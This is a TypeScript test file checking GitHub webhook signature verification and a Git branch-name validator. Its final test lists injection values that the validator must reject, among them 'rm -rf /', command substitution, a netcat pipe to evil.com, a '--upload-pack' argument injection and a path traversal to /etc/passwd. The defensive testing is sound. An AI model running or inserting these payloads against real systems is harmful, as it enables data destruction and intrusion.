import assert from "node:assert/strict";
import { createHmac } from "node:crypto";
import test from "node:test";
import { verifyGithubWebhookSignature, isValidGitBranch } from "./github-webhook.ts";

const rawBody = JSON.stringify({ action: "push", repository: { full_name: "putme-in/putmein" } });
const secret = "webhook-secret";
const validSignature = `sha256=${createHmac("sha256", secret).update(rawBody, "utf8").digest("hex")}`;

test("accepts a valid GitHub webhook signature", () => {
  assert.equal(verifyGithubWebhookSignature(rawBody, validSignature, secret), true);
});

test("rejects missing and malformed signatures", () => {
  assert.equal(verifyGithubWebhookSignature(rawBody, null, secret), false);
  assert.equal(verifyGithubWebhookSignature(rawBody, "sha1=not-sha256", secret), false);
  assert.equal(verifyGithubWebhookSignature(rawBody, "sha256=not-hex", secret), false);
});

test("rejects a signature when the raw request body changes", () => {
  assert.equal(verifyGithubWebhookSignature(`${rawBody}!`, validSignature, secret), false);
});

test("rejects signatures without a configured secret", () => {
  assert.equal(verifyGithubWebhookSignature(rawBody, validSignature, null), false);
});

test("accepts valid Git branch names", () => {
  assert.equal(isValidGitBranch("main"), true);
  assert.equal(isValidGitBranch("feature/auth-login"), true);
  assert.equal(isValidGitBranch("v1.0.4"), true);
  assert.equal(isValidGitBranch("fix_ci-pipeline.v2"), true);
  assert.equal(isValidGitBranch("release/2026.10"), true);
});

test("rejects command injection and malicious branch values", () => {
  assert.equal(isValidGitBranch("main; rm -rf /"), false);
  assert.equal(isValidGitBranch("main$(whoami)"), false);
  assert.equal(isValidGitBranch("main`id`"), false);
  assert.equal(isValidGitBranch("main && calc.exe"), false);
  assert.equal(isValidGitBranch("main | nc evil.com 1337"), false);
  assert.equal(isValidGitBranch("--upload-pack=evil"), false);
  assert.equal(isValidGitBranch("-b"), false);
  assert.equal(isValidGitBranch("../../../etc/passwd"), false);
  assert.equal(isValidGitBranch("refs/heads/../../evil"), false);
  assert.equal(isValidGitBranch("branch@{1}"), false);
  assert.equal(isValidGitBranch("/leading-slash"), false);
  assert.equal(isValidGitBranch("trailing-slash/"), false);
  assert.equal(isValidGitBranch("branch.lock"), false);
  assert.equal(isValidGitBranch(""), false);
  assert.equal(isValidGitBranch(null), false);
  assert.equal(isValidGitBranch(undefined), false);
});

